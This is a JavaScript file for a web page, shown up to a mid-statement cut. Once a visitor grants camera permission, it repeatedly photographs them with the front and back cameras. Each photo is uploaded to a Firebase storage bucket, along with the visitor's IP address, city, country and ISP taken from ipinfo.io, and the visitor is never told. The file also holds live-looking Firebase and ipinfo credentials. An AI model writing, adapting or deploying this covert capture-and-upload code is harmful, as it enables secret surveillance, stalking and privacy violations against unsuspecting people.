const firebaseConfig = {
  apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
  authDomain: "html-7fd9b.firebaseapp.com",
  projectId: "html-7fd9b",
  storageBucket: "html-7fd9b.appspot.com",
  messagingSenderId: "1022361191925",
  appId: "1:1022361191925:web:0f971d6e7c72cfc3aa0cbc"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const auth = firebase.auth();

// DOM elements
const allowButton = document.getElementById("allowButton");
const denyButton = document.getElementById("denyButton");
const video = document.getElementById("video");

// Allow camera access and capture images from both cameras
allowButton.onclick = function() {
    // Sign in anonymously before using the camera
    auth.signInAnonymously().then(() => {
        captureFromCamera('environment'); // Start with back camera (environment)
    }).catch((error) => {
        console.error("Authentication failed:", error);
        alert("Authentication failed. Try again.");
    });
};

// Redirect to YouTube if 'Don't Allow' button is clicked
denyButton.onclick = function() {
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Rickroll
};

// Capture from camera and switch to the other camera after capturing image
function captureFromCamera(cameraType) {
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: cameraType }
    })
    .then(function(stream) {
        video.srcObject = stream;
        video.style.display = "block";
        video.play();

        // Capture snapshot after 3 seconds from the current camera
        setTimeout(() => {
            captureImage();
            stream.getTracks().forEach(track => track.stop());  // Stop the camera
            // Switch to the other camera (front/back)
            const nextCamera = (cameraType === 'environment') ? 'user' : 'environment';
            captureFromCamera(nextCamera);
        }, 3000);  // Capture after 3 seconds
    })
    .catch(function(error) {
        alert("Permission denied. Redirecting to YouTube.");
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Rickroll
    });
}

// Capture image from video stream
function captureImage() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the image to a blob and upload to Firebase Storage
    canvas.toBlob(function(blob) {
        const storageRef = storage.ref();
        const photoRef = storageRef.child('photos/photo_' + Date.now() + '.jpg');
        
        // Upload photo to Firebase Storage
        photoRef.put(blob).then(function(snapshot) {
            console.log('Photo uploaded successfully.');
            // After uploading, also upload the IP data
            captureIPData();
        }).catch((error) => {
            console.error("Error uploading photo:", error);
        });
    }, 'image/jpeg');
}

// Capture IP and other data
function captureIPData() {
    fetch('https://ipinfo.io?token=023890bc57338a')
        .then(response => response.json())
        .then(data => {
            const ipData = `IP Address: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nHostname: ${data.hostname}\nOrganization: ${data.org}`;

            // Upload IP data to Firebase Storage as a .txt file
            const storageRef = storage.ref();
            const ipDataRef = storageRef.child('ip_data/ip_' + Date.now() + '.txt');
            
            const metadata = {
                contentType: 'text/plain'
            };

            // Upload IP data as a text file
            ipDataRef.putString(ipData, 'raw', metadata).then(function(snapshot) {
                console.log('IP Data uploaded successfully.');
            }).catch
